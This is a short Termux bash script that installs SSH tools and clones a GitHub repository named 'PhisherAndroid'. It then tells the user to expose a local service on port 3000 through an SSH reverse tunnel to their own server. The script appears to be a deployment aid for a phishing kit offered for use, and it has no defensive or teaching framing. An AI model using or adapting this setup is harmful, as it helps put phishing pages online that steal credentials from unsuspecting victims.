#!/data/data/com.termux/files/usr/bin/bash

# Developer Info
APP_AUTHOR="Navaneetha Krishnan"
APP_TITLE="Founder of NZT Foundation"
APP_LINKEDIN="https://www.linkedin.com/in/navaneetha-krishnan-m-8b41b52a1/"
APP_GITHUB="https://github.com/CuteKitty0000/"

echo "Author : $APP_AUTHOR"
echo "Title  : $APP_TITLE"
echo "GitHub : $APP_GITHUB"
echo

# Update & upgrade
apt update -y && apt upgrade -y

# Install packages
pkg install -y dropbear openssh git

# Clone repo
git clone https://github.com/CuteKitty0000/PhisherAndroid

echo
echo "Done!"
echo
echo "Run SSH tunnel (replace with your server):"
echo "ssh -R 80:localhost:3000 user@your-server.com"
